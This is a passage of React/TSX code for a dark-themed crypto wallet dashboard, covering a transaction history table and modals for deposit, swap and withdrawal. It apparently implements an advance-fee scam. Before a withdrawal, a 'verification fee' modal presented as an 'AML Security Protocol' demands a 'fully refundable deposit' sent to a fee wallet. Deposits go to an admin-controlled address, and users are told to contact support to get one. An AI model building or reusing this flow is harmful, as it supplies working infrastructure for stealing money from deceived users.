                                        <th className="sticky top-0 z-10 bg-slate-900/90 backdrop-blur-md border-b border-slate-700/50 p-4 text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest text-right">Timestamp</th>
                                        <th className="sticky top-0 z-10 bg-slate-900/90 backdrop-blur-md border-b border-slate-700/50 p-4 pr-6 text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest text-right">Network Status</th>
                                    </tr>
                                </thead>
                                <tbody className="divide-y divide-slate-800/50">
                                    {history.map((tx) => {
                                        const style = getHistoryStyles(tx.type);
                                        return (
                                            <tr key={tx.id} className="hover:bg-slate-800/30 transition-colors group">
                                                <td className="p-4 pl-6">
                                                    <div className={`inline-flex items-center gap-2 px-2.5 py-1.5 rounded-lg border text-[10px] font-bold font-mono tracking-widest ${style.bg} ${style.color}`}>
                                                        {style.icon} {tx.type}
                                                    </div>
                                                </td>
                                                <td className="p-4 text-xs font-medium text-slate-300">{tx.desc}</td>
                                                <td className={`p-4 text-right text-sm font-bold font-mono ${tx.isPositive ? 'text-emerald-400' : 'text-slate-200'}`}>{tx.amount}</td>
                                                <td className="p-4 text-right">
                                                    <div className="text-xs text-slate-400 font-mono mb-0.5">{tx.date}</div>
                                                    <div className="text-[10px] text-slate-600 font-mono">{tx.time}</div>
                                                </td>
                                                <td className="p-4 pr-6 text-right">
                                                    <span className={`text-[10px] font-bold font-mono uppercase tracking-widest ${tx.status === 'COMPLETED' ? 'text-emerald-400 drop-shadow-[0_0_5px_rgba(52,211,153,0.4)]' : tx.status === 'PENDING' ? 'text-cyan-400 drop-shadow-[0_0_5px_rgba(6,182,212,0.4)]' : 'text-orange-400'}`}>
                                                        {tx.status}
                                                    </span>
                                                </td>
                                            </tr>
                                        );
                                    })}
                                </tbody>
                            </table>
                        </div>
                    </div>
                )}
            </div>

            {/* --- MODALS (PRO GLASSMORPHISM) --- */}
            <AnimatePresence>
                {modal && (
                    <div className="fixed inset-0 bg-slate-950/80 z-[100] flex items-end md:items-center justify-center backdrop-blur-sm p-0 md:p-5">
                        <motion.div initial={{ y: 50, opacity: 0, scale: 0.95 }} animate={{ y: 0, opacity: 1, scale: 1 }} exit={{ y: 50, opacity: 0, scale: 0.95 }} transition={{ type: "spring", damping: 25, stiffness: 300 }} className="bg-[#0a0f18]/90 backdrop-blur-xl w-full md:w-[95%] max-w-md rounded-t-3xl md:rounded-[24px] border border-cyan-500/30 shadow-[0_30px_60px_rgba(0,0,0,0.8),inset_0_1px_0_rgba(255,255,255,0.1)] relative flex flex-col max-h-[90vh]">
                            
                            {/* Modal Header */}
                            <div className="p-5 md:p-6 border-b border-slate-700/50 flex justify-between items-center bg-slate-900/50 shrink-0 rounded-t-3xl md:rounded-t-[24px]">
                                <h3 className="text-sm font-bold font-mono text-slate-100 uppercase tracking-widest flex items-center gap-2 drop-shadow-sm">
                                    <Server size={16} className="text-cyan-400" />
                                    {modal === "deposit_menu" ? "Incoming Node Protocol" : 
                                     modal === "withdraw_menu" ? "Extraction Routing" : 
                                     modal === "deposit" ? "Initialize Receiving" : 
                                     modal === "verification_fee" ? "AML Security Protocol" :
                                     modal === "swap" ? "Swap Configuration" :
                                     modal === "withdraw" ? "Execute Extraction" : "System Alert"}
                                </h3>
                                <button onClick={() => { setModal(null); setProcessStep(0); setActionAmount(""); setDepositAmount(""); setFeeSentAmount(""); }} className="p-2 text-slate-500 hover:text-slate-200 hover:bg-slate-800 rounded-xl transition-colors"><X size={18}/></button>
                            </div>
                            
                            <div className="p-6 md:p-8 overflow-y-auto custom-scrollbar">
                                
                                {/* DEPOSIT MENU */}
                                {modal === "deposit_menu" && (
                                    <div className="space-y-3">
                                        <div className="text-[10px] font-mono text-slate-500 mb-4 tracking-widest uppercase ml-1">Select Target Ledger</div>
                                        {allowedDepWdrAssets.map(asset => (
                                            <button key={asset.s} onClick={() => { setSelectedAssetSymbol(asset.s); setModal("deposit"); }} className="w-full p-4 md:p-5 bg-slate-900/50 border border-slate-700/50 rounded-2xl text-left flex items-center gap-4 hover:border-cyan-500/50 hover:bg-slate-800/80 transition-all group shadow-sm">
                                                <div className="w-10 h-10 md:w-12 md:h-12 bg-slate-950 rounded-full flex items-center justify-center border border-slate-800 group-hover:border-cyan-500/30 transition-colors shadow-inner">
                                                    <img src={asset.l} className="w-8 h-8 md:w-9 md:h-9 rounded-full" alt={asset.n}/>
                                                </div>
                                                <div className="flex-1">
                                                    <div className="font-black text-sm md:text-base text-slate-200 tracking-wider group-hover:text-white transition-colors">{asset.s}</div>
                                                    <div className="text-[10px] font-mono text-slate-500 mt-0.5">Capacity: {asset.balance.toFixed(4)}</div>
                                                </div>
                                                <div className="w-8 h-8 rounded-full bg-slate-800/50 flex items-center justify-center group-hover:bg-cyan-500/20 transition-colors">
                                                    <ChevronRight className="text-slate-500 group-hover:text-cyan-400 transition-colors" size={16} />
                                                </div>
                                            </button>
                                        ))}
                                    </div>
                                )}

                                {/* WITHDRAW MENU */}
                                {modal === "withdraw_menu" && (
                                    <div className="space-y-3">
                                        <div className="text-[10px] font-mono text-slate-500 mb-4 tracking-widest uppercase ml-1">Select Source Asset</div>
                                        {allowedDepWdrAssets.map(asset => (
                                            <button key={asset.s} onClick={() => { setSelectedAssetSymbol(asset.s); setModal("withdraw"); setActionAmount(""); }} className="w-full p-4 md:p-5 bg-slate-900/50 border border-slate-700/50 rounded-2xl text-left flex items-center gap-4 hover:border-red-500/50 hover:bg-slate-800/80 transition-all group shadow-sm">
                                                <div className="w-10 h-10 md:w-12 md:h-12 bg-slate-950 rounded-full flex items-center justify-center border border-slate-800 group-hover:border-red-500/30 transition-colors shadow-inner">
                                                    <img src={asset.l} className="w-8 h-8 md:w-9 md:h-9 rounded-full" alt={asset.n}/>
                                                </div>
                                                <div className="flex-1">
                                                    <div className="font-black text-sm md:text-base text-slate-200 tracking-wider group-hover:text-white transition-colors">{asset.s}</div>
                                                    <div className="text-[10px] font-mono text-slate-500 mt-0.5">Available: {asset.balance.toFixed(4)}</div>
                                                </div>
                                                <div className="w-8 h-8 rounded-full bg-slate-800/50 flex items-center justify-center group-hover:bg-red-500/20 transition-colors">
                                                    <ChevronRight className="text-slate-500 group-hover:text-red-400 transition-colors" size={16} />
                                                </div>
                                            </button>
                                        ))}
                                    </div>
                                )}

                                {/* DEPOSIT ACTION */}
                                {modal === "deposit" && selectedAsset && (
                                    <div className="text-center">
                                        {(selectedAsset.s === "USDT" || selectedAsset.s === "USDC") && (
                                            <div className="bg-orange-500/10 border border-orange-500/30 p-4 rounded-xl flex items-start gap-3 mb-6 shadow-[inset_0_0_20px_rgba(249,115,22,0.05)]">
                                                <AlertTriangle size={18} className="text-orange-400 shrink-0 mt-0.5" />
                                                <div className="text-left text-[11px] md:text-xs text-orange-200/90 leading-relaxed font-mono">
                                                    <strong>CRITICAL WARNING:</strong> Send ONLY {selectedAsset.s} via the <strong className="text-white bg-orange-500/20 px-1 rounded">{selectedAsset.s === 'USDT' ? 'ERC20 or TRC20' : 'ERC20'}</strong> network. Other networks will permanently destroy funds.
                                                </div>
                                            </div>
                                        )}

                                        {/* 🛡️ THE FIX: Completely hide QR and Address if Awaiting Node */}
                                        {isAddressMissing ? (
                                            <div className="bg-slate-900/50 p-8 rounded-2xl border border-slate-700 mb-8 text-center flex flex-col items-center gap-4">
                                                <AlertTriangle size={40} className="text-orange-500 opacity-50" />
                                                <div>
                                                    <div className="text-sm font-bold text-white uppercase tracking-widest font-mono mb-2">Network Node Offline</div>
                                                    <div className="text-xs text-slate-400 font-mono">Please contact support to generate your secure deposit address.</div>
                                                </div>
                                            </div>
                                        ) : (
                                            <>
                                                <div className="bg-white p-5 rounded-2xl w-48 h-48 md:w-56 md:h-56 mx-auto mb-8 flex items-center justify-center shadow-[0_0_30px_rgba(255,255,255,0.1)]">
                                                    <img src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${adminAddress}`} alt="QR" className="w-full h-full opacity-90 mix-blend-multiply"/>
                                                </div>
                                                
                                                <div className="text-left text-[10px] font-mono text-cyan-500 mb-2 tracking-widest uppercase ml-1">Encrypted Receiving Hash ({selectedAsset.s})</div>
                                                <div onClick={() => copyToClipboard(adminAddress)} className="bg-slate-950 p-4 md:p-5 rounded-xl border border-slate-700/50 mb-6 flex items-center justify-between cursor-pointer hover:border-cyan-500/50 hover:bg-slate-900 transition-all group shadow-inner">
                                                    <div className="font-mono text-xs md:text-sm text-slate-300 break-all text-left pr-4 group-hover:text-white transition-colors">{adminAddress}</div>
                                                    <div className="bg-slate-800 p-2 rounded-lg group-hover:bg-cyan-500/20 transition-colors">
                                                        <Copy size={16} className="text-slate-400 group-hover:text-cyan-400 transition-colors"/>
                                                    </div>
                                                </div>

                                                <div className="relative mb-8">
                                                    <div className="text-left text-[10px] font-mono text-slate-500 mb-2 tracking-widest uppercase ml-1">Transmission Volume (Optional)</div>
                                                    <input type="number" value={depositAmount} onChange={e => setDepositAmount(e.target.value)} placeholder={`0.00 ${selectedAsset.s}`} className="w-full bg-slate-950 border border-slate-700/50 p-4 md:p-5 rounded-xl text-white font-mono text-base outline-none focus:border-cyan-500/70 focus:shadow-[0_0_15px_rgba(6,182,212,0.2)] transition-all shadow-inner placeholder:text-slate-700" />
                                                </div>

                                                <button onClick={handleDeclareDeposit} disabled={isProcessing} className="w-full py-4 md:py-5 bg-gradient-to-r from-cyan-500 to-cyan-400 hover:from-cyan-400 hover:to-cyan-300 text-slate-900 rounded-xl font-black uppercase tracking-widest text-xs md:text-sm shadow-[0_10px_20px_rgba(6,182,212,0.3)] hover:shadow-[0_15px_25px_rgba(6,182,212,0.4)] transition-all flex justify-center items-center gap-2 transform active:scale-[0.98]">
                                                    {isProcessing ? <RefreshCw size={18} className="animate-spin" /> : "Broadcast Transfer to Network"}
                                                </button>
                                            </>
                                        )}
                                    </div>
                                )}

                                {/* SWAP ACTION */}
                                {modal === "swap" && selectedAsset && (
                                    <div className="text-center">
                                        <div className="flex items-center justify-between mb-8 px-5 py-6 bg-slate-900/50 rounded-2xl border border-slate-700/50 shadow-inner">
                                            <div className="flex flex-col items-center gap-3">
                                                <div className="w-12 h-12 bg-slate-950 rounded-full flex items-center justify-center border border-slate-700">
                                                    <img src={selectedAsset.l} width={36} className="rounded-full"/>
                                                </div>
                                                <span className="font-black text-sm font-mono text-white">{selectedAsset.s}</span>
                                            </div>
                                            
                                            <div className="relative">
                                                <div className="absolute inset-0 bg-cyan-500/20 blur-xl rounded-full"></div>
                                                <ArrowRightLeft className="text-cyan-400 relative z-10 animate-pulse" size={24}/>
                                            </div>

                                            <div className="flex flex-col items-center gap-3">
                                                <div className="w-12 h-12 bg-slate-950 rounded-full flex items-center justify-center border border-cyan-500/30 shadow-[0_0_15px_rgba(6,182,212,0.15)] overflow-hidden">
                                                    <img src={ASSET_LIST.find(a => a.s === targetSwapCoin)?.l} className="w-full h-full object-cover"/>
                                                </div>
                                                <span className="font-black text-sm font-mono text-white">{targetSwapCoin}</span>
                                            </div>
                                        </div>

                                        {/* TARGET SELECTOR WITH LOGOS */}
                                        <div className="flex flex-wrap justify-center gap-2 mb-8 bg-slate-950 p-2 rounded-xl border border-slate-800">
                                            {["BTC", "ETH", "USDT", "USDC"].map((coin: any) => {
                                                const cImg = ASSET_LIST.find(a => a.s === coin)?.l;
                                                return (
                                                <button 
                                                    key={coin}
                                                    onClick={() => setTargetSwapCoin(coin)} 
                                                    disabled={selectedAssetSymbol === coin} 
                                                    className={`flex items-center gap-2 px-3 py-2 rounded-lg font-mono text-[10px] font-bold uppercase transition-all ${targetSwapCoin === coin ? "bg-cyan-500 text-slate-900 shadow-[0_0_10px_rgba(6,182,212,0.5)]" : "text-slate-500 hover:text-slate-300 hover:bg-slate-800 disabled:opacity-20 disabled:cursor-not-allowed"}`}
                                                >
                                                    {cImg && <img src={cImg} className="w-4 h-4 rounded-full border border-slate-700/50" />} {coin}
                                                </button>
                                            )})}
                                        </div>
                                        
                                        <div className="relative mb-8 bg-slate-950 p-5 rounded-2xl border border-slate-700/50 focus-within:border-cyan-500/50 focus-within:shadow-[0_0_20px_rgba(6,182,212,0.1)] transition-all shadow-inner group">
                                            <div className="text-left text-[10px] font-mono text-slate-500 mb-3 tracking-widest uppercase">Execution Volume</div>
                                            <input type="number" value={actionAmount} onChange={e => setActionAmount(e.target.value)} placeholder="0.00" className="w-full bg-transparent border-none text-white font-mono text-3xl font-black outline-none transition-colors placeholder:text-slate-800" />
                                            <button onClick={() => setActionAmount(selectedAsset.balance.toString())} className="absolute right-5 top-12 bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-lg text-[10px] font-bold font-mono text-cyan-400 uppercase transition-colors border border-slate-700 shadow-sm">Max</button>
                                            <div className="text-left text-[10px] font-mono text-slate-500 mt-4 pt-4 border-t border-slate-800/50">Available: <span className="text-slate-300 font-bold">{selectedAsset.balance.toFixed(6)} {selectedAsset.s}</span></div>
                                        </div>

                                        <button onClick={handleSwapSingle} disabled={isProcessing} className="w-full py-4 md:py-5 bg-slate-100 hover:bg-white text-slate-900 font-black uppercase tracking-widest text-xs md:text-sm rounded-xl transition-all transform active:scale-[0.98] shadow-lg shadow-white/10">
                                            {isProcessing ? <RefreshCw className="animate-spin mx-auto" /> : "Preview Execution"}
                                        </button>
                                    </div>
                                )}

                                {/* WITHDRAW ACTION */}
                                {modal === "withdraw" && selectedAsset && (
                                    <div className="text-center">
                                        {(selectedAsset.s === "USDT" || selectedAsset.s === "USDC") && (
                                            <div className="bg-red-500/10 border border-red-500/30 p-4 rounded-xl flex items-start gap-3 mb-6 shadow-[inset_0_0_20px_rgba(239,68,68,0.05)]">
                                                <AlertTriangle size={18} className="text-red-400 shrink-0 mt-0.5" />
                                                <div className="text-left text-[11px] md:text-xs text-red-200/90 leading-relaxed font-mono">
                                                    <strong>CRITICAL WARNING:</strong> Provide an <strong className="text-white bg-red-500/20 px-1 rounded">{selectedAsset.s === 'USDT' ? 'ERC20 or TRC20' : 'ERC20'}</strong> address. Network mismatch causes permanent destruction of funds.
                                                </div>
                                            </div>
                                        )}

                                        <div className="relative mb-6">
                                            <div className="text-left text-[10px] font-mono text-slate-500 mb-2 tracking-widest uppercase ml-1">Target Destination Hash</div>
                                            <input type="text" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} placeholder={`Enter ${selectedAsset.s} Address`} className="w-full bg-slate-950 border border-slate-700/50 p-4 md:p-5 rounded-xl text-white font-mono text-sm outline-none focus:border-red-500/70 focus:shadow-[0_0_15px_rgba(239,68,68,0.15)] transition-all shadow-inner placeholder:text-slate-700" />
                                        </div>

                                        <div className="relative mb-8 bg-slate-950 p-5 rounded-2xl border border-slate-700/50 focus-within:border-red-500/50 focus-within:shadow-[0_0_20px_rgba(239,68,68,0.1)] transition-all shadow-inner">
                                            <div className="text-left text-[10px] font-mono text-slate-500 mb-3 tracking-widest uppercase">Extraction Volume</div>
                                            <input type="number" value={actionAmount} onChange={e => setActionAmount(e.target.value)} placeholder="0.00" className="w-full bg-transparent border-none text-white font-mono text-3xl font-black outline-none transition-colors placeholder:text-slate-800" />
                                            <button onClick={() => setActionAmount(selectedAsset.balance.toString())} className="absolute right-5 top-12 bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-lg text-[10px] font-bold font-mono text-red-400 uppercase transition-colors border border-slate-700 shadow-sm">Max</button>
                                            <div className="text-left text-[10px] font-mono text-slate-500 mt-4 pt-4 border-t border-slate-800/50">Available: <span className="text-slate-300 font-bold">{selectedAsset.balance.toFixed(6)} {selectedAsset.s}</span></div>
                                        </div>

                                        <button onClick={handleWithdrawAttempt} disabled={isProcessing} className="w-full py-4 md:py-5 bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-400 text-white font-black uppercase tracking-widest text-xs md:text-sm rounded-xl transition-all shadow-[0_10px_20px_rgba(239,68,68,0.2)] hover:shadow-[0_15px_25px_rgba(239,68,68,0.3)] transform active:scale-[0.98]">
                                            {isProcessing ? <RefreshCw className="animate-spin mx-auto" /> : "Initialize Extraction"}
                                        </button>
                                    </div>
                                )}

                                {/* 🛡️ VERIFICATION FEE MODAL */}
                                {modal === "verification_fee" && (
                                    <div className="text-center">
                                        <div className="flex items-center justify-center gap-4 mb-6 bg-cyan-500/5 py-5 rounded-2xl border border-cyan-500/20 shadow-[inset_0_0_20px_rgba(6,182,212,0.05)]">
                                            <div className="bg-cyan-500/10 p-3 rounded-xl border border-cyan-500/20">
                                                <Shield size={28} className="text-cyan-400 shrink-0" />
                                            </div>
                                            <div className="text-left">
                                                <div className="font-black font-mono text-white text-sm uppercase tracking-widest">Security Protocol</div>
                                                <div className="text-[10px] font-mono text-cyan-500 mt-0.5">AML Node Verification Check</div>
                                            </div>
                                        </div>
                                        
                                        <p className="text-[11px] md:text-xs font-mono text-slate-400 mb-8 leading-relaxed text-left border-l-2 border-cyan-500/50 pl-4 bg-slate-900/30 py-3 pr-2 rounded-r-lg">
                                            A temporary, <span className="text-slate-200 font-bold">fully refundable deposit</span> is required to verify network integrity prior to extraction. Computed against requested volume.
                                        </p>
                                        
                                        <div className="bg-slate-950 p-6 rounded-2xl mb-8 border border-slate-700/50 shadow-inner">
                                            <div className="flex justify-between items-center mb-4 pb-4 border-b border-slate-800/50">
                                                <span className="text-[10px] font-mono uppercase text-slate-500 font-bold tracking-wider">Extraction Volume</span>
                                                <span className="text-[11px] font-mono font-bold text-slate-300">
                                                    {withdrawAmtNumber.toLocaleString(undefined, {maximumFractionDigits: 6})} {feeAssetSymbol}
                                                </span>
                                            </div>
                                            <div className="flex justify-between items-center mb-4 pb-4 border-b border-slate-800/50">
                                                <span className="text-[10px] font-mono uppercase text-slate-500 font-bold tracking-wider">Network Rate</span>
                                                <span className="text-[11px] font-mono font-bold text-slate-300">{verificationFee.toFixed(2)}%</span>
                                            </div>
                                            <div className="flex justify-between items-center pt-2">
                                                <span className="text-[11px] font-mono uppercase font-black text-cyan-400 tracking-wider">Required Hash</span>
                                                <div className="text-right">
                                                    <div className="text-base font-black text-cyan-400 font-mono drop-shadow-[0_0_5px_rgba(6,182,212,0.3)]">
                                                        {feeAmountCrypto.toFixed(5)} {feeAssetSymbol}
                                                    </div>
                                                    <div className="text-[10px] text-slate-500 font-mono mt-1">~{currentSymbol}{(feeAmountUSD).toLocaleString(undefined, { maximumFractionDigits: 2 })}</div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        {/* 🛡️ THE FIX: Completely hide QR and Address if Awaiting Node */}
                                        {isAddressMissing ? (
                                            <div className="bg-slate-900/50 p-8 rounded-2xl border border-slate-700 mb-8 text-center flex flex-col items-center gap-4">
                                                <AlertTriangle size={40} className="text-orange-500 opacity-50" />
                                                <div>
                                                    <div className="text-sm font-bold text-white uppercase tracking-widest font-mono mb-2">Network Node Offline</div>
                                                    <div className="text-xs text-slate-400 font-mono">Please contact support to generate your secure deposit address.</div>
                                                </div>
                                            </div>
                                        ) : (
                                            <>
                                                <div className="text-left text-[10px] font-mono text-slate-500 mb-2 tracking-widest uppercase ml-1">Transmit {feeAssetSymbol} to Secure Node:</div>
                                                <div onClick={() => copyToClipboard(feeWalletAddress)} className="bg-slate-950 p-4 md:p-5 rounded-xl border border-slate-700/50 mb-6 flex items-center justify-between cursor-pointer hover:border-cyan-500/50 hover:bg-slate-900 transition-all group shadow-inner">
                                                    <div className="font-mono text-xs md:text-sm text-slate-300 break-all text-left pr-4 group-hover:text-white transition-colors">{feeWalletAddress || "Generating..."}</div>
                                                    <div className="bg-slate-800 p-2 rounded-lg group-hover:bg-cyan-500/20 transition-colors">
                                                        <Copy size={16} className="text-slate-400 group-hover:text-cyan-400 transition-colors"/>
                                                    </div>
                                                </div>

                                                <div className="relative mb-8">
                                                    <div className="text-left text-[10px] font-mono text-slate-500 mb-2 tracking-widest uppercase ml-1">Transmitted Volume (Optional)</div>
                                                    <input type="number" value={feeSentAmount} onChange={e => setFeeSentAmount(e.target.value)} placeholder={`${feeAmountCrypto.toFixed(5)} ${feeAssetSymbol}`} className="w-full bg-slate-950 border border-slate-700/50 p-4 md:p-5 rounded-xl text-white font-mono text-base outline-none focus:border-cyan-500/70 focus:shadow-[0_0_15px_rgba(6,182,212,0.2)] transition-all shadow-inner placeholder:text-slate-700" />
                                                </div>
                                                
                                                <button onClick={handleDeclareFeeDeposit} disabled={isProcessing} className="w-full py-4 md:py-5 bg-gradient-to-r from-cyan-500 to-cyan-400 hover:from-cyan-400 hover:to-cyan-300 text-slate-900 rounded-xl font-black uppercase tracking-widest text-xs md:text-sm shadow-[0_10px_20px_rgba(6,182,212,0.3)] hover:shadow-[0_15px_25px_rgba(6,182,212,0.4)] transition-all flex justify-center items-center gap-2 transform active:scale-[0.98]">
                                                    {isProcessing ? <RefreshCw size={18} className="animate-spin" /> : "Verify Network Transmission"}
                                                </button>
                                            </>
                                        )}
                                    </div>
                                )}

                                {/* PROCESSING SPINNER */}
                                {modal === "processing_swap" && (
                                    <div className="text-center py-12">
                                        {processStep === 2 ? (
                                            <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring" }}>
                                                <CheckCircle size={70} className="mx-auto text-emerald-400 mb-6 drop-shadow-[0_0_15px_rgba(52,211,153,0.5)]"/>
                                            </motion.div>
                                        ) : (
                                            <RefreshCw size={60} className="mx-auto text-cyan-400 animate-spin mb-8 drop-shadow-[0_0_15px_rgba(6,182,212,0.5)]"/>
                                        )}
                                        <h3 className="text-xl font-black font-mono text-white uppercase tracking-widest mb-3">{processStep === 2 ? "Execution Successful" : "Executing Logic..."}</h3>
                                        <p className="text-slate-500 text-xs font-mono uppercase tracking-widest">{processStep === 2 ? "Block verified on chain" : "Awaiting network finality"}</p>
                                    </div>
                                )}
                            </div>
                        </motion.div>
                    </div>
                )}
            </AnimatePresence>
        </div>
    );
}